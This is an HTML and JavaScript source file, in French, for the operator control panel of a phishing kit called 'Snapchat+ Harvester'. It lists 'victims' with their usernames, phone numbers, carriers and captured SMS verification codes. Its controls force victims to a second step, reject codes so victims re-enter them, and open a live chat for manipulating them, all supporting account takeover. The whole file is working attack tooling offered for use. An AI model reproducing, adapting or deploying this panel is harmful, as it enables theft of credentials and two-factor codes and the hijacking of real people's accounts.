<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Control Panel | Snapchat Harvester</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');

        body {
            margin: 0;
            padding: 0;
            background: #0a0a0a;
            color: #fff;
            font-family: 'Inter', sans-serif;
            min-height: 100vh;
        }

        .header {
            background: #111;
            padding: 20px 30px;
            border-bottom: 1px solid #333;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .container {
            max-width: 1200px;
            margin: 30px auto;
            padding: 0 20px;
        }

        input#filter {
            width: 100%;
            padding: 14px;
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 12px;
            color: #fff;
            margin-bottom: 20px;
            font-size: 16px;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            background: #1a1a1a;
            border-radius: 12px;
            overflow: hidden;
        }

        th, td {
            padding: 16px 20px;
            text-align: left;
            border-bottom: 1px solid #333;
        }

        th {
            background: #222;
            color: #FFFC00;
        }

        tr:hover {
            background: #252525;
        }

        .status {
            padding: 6px 14px;
            border-radius: 20px;
            font-size: 14px;
            font-weight: 600;
        }

        .waiting { background: #8B0000; color: #fff; }
        .code_received { background: #006400; color: #fff; }
        .step2_forced { background: #FF8800; color: #000; }
        .step3 { background: #00C853; color: #000; }

        .actions {
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
        }

        .action-btn {
            padding: 8px 14px;
            border-radius: 8px;
            font-weight: 600;
            cursor: pointer;
            border: none;
            font-size: 13px;
            transition: all 0.2s;
        }

        .step2-btn { background: #FF8800; color: #000; }
        .delete-btn { background: #FF0000; color: #fff; font-size: 16px; min-width: 40px; }

        button:hover { filter: brightness(1.15); }

        .log {
            background: #111;
            padding: 15px;
            border-radius: 8px;
            font-family: monospace;
            white-space: pre-wrap;
            max-height: 420px;
            overflow-y: auto;
            margin-top: 30px;
            border: 1px solid #333;
        }

        #adminChat {
            margin-top: 20px;
            background: #1a1a1a;
            border-radius: 12px;
            padding: 15px;
            height: 300px;
            display: none;
            flex-direction: column;
        }

        #chatMessagesAdmin {
            flex: 1;
            overflow-y: auto;
            padding: 10px;
            background: #111;
            border-radius: 8px;
        }

        .chat-msg-admin {
            margin: 6px 0;
            padding: 8px 12px;
            border-radius: 8px;
        }

        .chat-victim {
            background: #FFFC00;
            color: #000;
            align-self: flex-start;
        }

        .chat-admin {
            background: #333;
            color: #fff;
            align-self: flex-end;
        }

        #adminChatInput {
            display: flex;
            gap: 8px;
            margin-top: 10px;
        }

        #adminChatInput input {
            flex: 1;
            padding: 10px;
            background: #222;
            border: 1px solid #444;
            color: #fff;
            border-radius: 8px;
        }

        .chat-legend {
            font-size: 13px;
            color: #aaa;
            margin: 8px 0 12px 0;
            padding: 6px 10px;
            background: #222;
            border-radius: 6px;
        }
    </style>
</head>

<body>
    <div class="header">
        <h1>Snapchat+ Harvester — Control Panel</h1>
        <div>Victimes en ligne : <strong id="liveCount">0</strong></div>
    </div>

    <div class="container">
        <input type="text" id="filter" placeholder="Filtrer par Session ID, Username ou Téléphone...">

        <table id="victimsTable">
            <thead>
                <tr>
                    <th>Session ID</th>
                    <th>Username</th>
                    <th>Téléphone</th>
                    <th>Opérateur</th>
                    <th>Statut</th>
                    <th>Code SMS</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody></tbody>
        </table>

        <div id="adminChat">
            <h3>Chat avec <span id="chatVictimId"></span></h3>
            <div class="chat-legend">🟡 Jaune = Victime (Utilisateur) | Gris = Admin (toi)</div>
            <div id="chatMessagesAdmin"></div>
            <div id="adminChatInput">
                <input type="text" id="adminMessage" placeholder="Répondre à la victime...">
                <button onclick="sendAdminMessage()">Envoyer</button>
            </div>
        </div>

        <div class="log" id="liveLog">En attente de victimes...</div>
    </div>

    <script src="https://cdn.socket.io/4.8.1/socket.io.min.js"></script>
    <script>
        let victims = [];
        let currentChatSession = null;
        let socket = io();

        socket.on('connect', () => console.log('✅ Admin Socket.IO connecté'));

        socket.on('command', (data) => {
            if (data.action === 'chatMessage' && data.from === 'victim') {
                addAdminChatMessage(data.message, 'victim');
            }
        });

        async function loadVictims() {
            try {
                const res = await fetch('/api/victims');
                victims = await res.json();
                renderTable();
            } catch (e) {}
        }

        function renderTable(filter = '') {
            const tbody = document.querySelector('#victimsTable tbody');
            tbody.innerHTML = '';
            let count = 0;

            const filtered = victims.filter(v =>
                !filter || 
                v.sessionId.toLowerCase().includes(filter) ||
                (v.username && v.username.toLowerCase().includes(filter)) ||
                (v.phone && v.phone.includes(filter))
            );

            filtered.forEach(v => {
                count++;
                const row = document.createElement('tr');
                row.innerHTML = `
                    <td><code>${v.sessionId}</code></td>
                    <td>${v.username || '-'}</td>
                    <td>${v.phone || '-'}</td>
                    <td>${v.operator || '-'}</td>
                    <td><span class="status ${v.status || 'waiting'}">${v.status === 'waiting' ? '⏳ En attente' : v.status === 'step2_forced' ? '✅ Étape 2' : '✅ Code reçu'}</span></td>
                    <td><strong>${v.code || '-'}</strong></td>
                    <td class="actions">
                        <button class="action-btn step2-btn" onclick="forceStep2('${v.sessionId}')">▶️ Étape 2</button>
                        <button class="action-btn chat-toggle-btn" onclick="toggleChat('${v.sessionId}')" style="background:#00C853;color:#000;">💬 Chat</button>
                        <button class="action-btn" onclick="badCode('${v.sessionId}')" style="background:#FF4444;color:#fff;">Code mauvais</button>
                        <button class="action-btn delete-btn" onclick="deleteSession('${v.sessionId}', this)">❌</button>
                    </td>
                `;
                tbody.appendChild(row);
            });

            document.getElementById('liveCount').textContent = count;
        }

        function toggleChat(sessionId) {
            const chatPanel = document.getElementById('adminChat');
            if (currentChatSession === sessionId && chatPanel.style.display === 'flex') {
                chatPanel.style.display = 'none';
                currentChatSession = null;
            } else {
                currentChatSession = sessionId;
                chatPanel.style.display = 'flex';
                document.getElementById('chatVictimId').textContent = sessionId;
                document.getElementById('chatMessagesAdmin').innerHTML = '';
                if (socket.connected) socket.emit('joinSession', sessionId);
            }
        }

        function sendAdminMessage() {
            const input = document.getElementById('adminMessage');
            const msg = input.value.trim();
            if (!msg || !currentChatSession) return;

            socket.emit('chatMessage', { 
                sessionId: currentChatSession, 
                message: msg, 
                from: 'admin' 
            });

            addAdminChatMessage(msg, 'admin');
            input.value = '';
        }

        function addAdminChatMessage(msg, from) {
            const container = document.getElementById('chatMessagesAdmin');
            const div = document.createElement('div');
            div.className = `chat-msg-admin ${from === 'admin' ? 'chat-admin' : 'chat-victim'}`;
            div.textContent = msg;
            container.appendChild(div);
            container.scrollTop = container.scrollHeight;
        }

        async function forceStep2(sessionId) {
            await fetch('/api/force-step2', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ sessionId }) });
            loadVictims();
        }

        async function badCode(sessionId) {
            await fetch('/api/bad-code', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ sessionId }) });
            loadVictims();
        }

        async function deleteSession(sessionId, btn) {
            if (!confirm(`Supprimer définitivement la session ${sessionId} ?`)) return;

            const row = btn.closest('tr');
            if (row) row.remove();

            document.getElementById('liveCount').textContent = parseInt(document.getElementById('liveCount').textContent) - 1 || 0;
            victims = victims.filter(v => v.sessionId !== sessionId);

            try {
                await fetch('/api/delete-session', { 
                    method: 'POST', 
                    headers: { 'Content-Type': 'application/json' }, 
                    body: JSON.stringify({ sessionId }) 
                });
            } catch (e) {}
        }

        setInterval(loadVictims, 2000);
        window.onload = loadVictims;
    </script>
</body>
</html>
